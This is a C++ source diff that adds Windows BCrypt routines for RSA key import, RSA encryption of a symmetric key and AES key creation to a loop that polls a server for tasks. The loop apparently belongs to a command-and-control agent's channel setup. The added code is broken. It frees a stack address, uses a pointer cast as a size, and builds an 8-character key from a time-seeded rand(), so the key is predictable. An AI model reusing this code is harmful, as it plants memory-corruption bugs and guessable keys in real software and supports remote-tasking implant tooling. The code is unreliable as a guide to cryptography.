@@ -29,6 +29,74 @@ void tasks()
 
 
 
+BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
+    BCRYPT_ALG_HANDLE rsahandle;
+    BCryptOpenAlgorithmProvider(&rsahandle,BCRYPT_RSA_ALGORITHM,NULL,0);
+    BCRYPT_KEY_HANDLE outro=new BCRYPT_KEY_HANDLE;
+    BCryptImportKeyPair(rsahandle,NULL,BCRYPT_RSAPUBLIC_BLOB,&outro,pbinnput,pbinputsize,BCRYPT_NO_KEY_VALIDATION);
+    return outro;
+}
+PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle,PUCHAR symkey, ULONG symkeysize){ 
+    //Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
+    ULONG encbuffersize;
+    NTSTATUS status = BCryptEncrypt(rsakeyhandle,
+    symkey,
+    symkeysize,
+    NULL,
+    NULL,
+    0,
+    NULL,
+    0,
+    &encbuffersize,
+    0);
+    PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
+    if (encbuffer == NULL) {
+        printf("failed to allocate memory for blindedFEKBuffer\n");
+    }
+    BCryptEncrypt(rsakeyhandle,symkey,symkeysize,NULL,NULL,0,encbuffer,encbuffersize,&encbuffersize,0);
+    return encbuffer;
+}
+char* getsecret(){
+    char* secret=(char*)malloc(8);
+    std::string alphabet="abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    unsigned int ms =std::time(nullptr);
+    double mod=61;
+    srand(ms);
+    for(int i=0;i<8;i++){
+        if(i==4){
+            srand(ms+1);
+        }
+        int randomvalue=std::fmod(rand(),mod);
+        secret[i]=alphabet[randomvalue];
+    }
+    return secret;
+}
+
+ BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey){
+    BCRYPT_ALG_HANDLE ahandle;
+    BCRYPT_KEY_HANDLE symkeyhandle = new BCRYPT_KEY_HANDLE;
+    ULONG symkeypropertylen;
+    ULONG bytescopied;
+    BCryptOpenAlgorithmProvider(&ahandle,BCRYPT_AES_GMAC_ALGORITHM,NULL,0);
+    
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
+    PUCHAR symkeylen=(PUCHAR)malloc(symkeypropertylen);
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,symkeylen,symkeypropertylen,&bytescopied,0);
+    PUCHAR symkey=(PUCHAR)malloc((int)symkeylen);  
+    
+    /*
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
+    PUCHAR symkeyobjlen=(PUCHAR)malloc(symkeypropertylen);
+    BCryptGetProperty(ahandle,BCRYPT_OBJECT_LENGTH,symkeyobjlen,symkeypropertylen,&bytescopied,0);
+    PUCHAR symkeyobj=(PUCHAR)malloc((int)symkeyobjlen);
+    */
+    char* secret=getsecret();
+    BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,NULL,0,(PUCHAR)secret,8,0);
+    //BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,symkeyobj,(ULONG)symkeyobjlen,(PUCHAR)secret,8,0);
+    free(&symkeypropertylen);
+    free(symkeylen);
+    return symkeyhandle;
+    }
 
 
 
@@ -217,8 +285,11 @@ LPSTR getTasks(void){
     return item;
 }
 void runLoop(bool isRunning){
+    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)*serverpublickey,(ULONG)562);
+    newsymkey(rsakey);
     while (isRunning) {
         try {
+
             LPSTR getting = getTasks();
             //const auto serverResponse = std::async(std::launch::async, getTasks);
             //auto parsedTasks = parseTasks(serverResponse.get());
